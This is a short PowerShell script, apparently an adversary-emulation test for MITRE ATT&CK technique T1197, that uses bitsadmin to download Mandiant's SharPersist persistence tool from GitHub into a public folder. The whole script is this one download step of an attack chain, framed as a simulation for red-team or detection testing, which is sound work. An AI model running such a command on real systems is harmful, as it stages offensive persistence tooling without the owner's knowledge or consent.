# Donwload SharPersist using Bitsadmin
# Technic ID : T1197
Clear-Host
Write-Output "==============================================================================="
Write-Output "BITS Job : Donwload SharPersist using Bitsadmin (T1197)"
Write-Output "==============================================================================="
#
bitsadmin  /transfer DonwloadJob /download /priority normal https://github.com/mandiant/SharPersist/releases/download/v1.0.1/SharPersist.exe $env:PUBLIC\Toolz\SharPersist.exe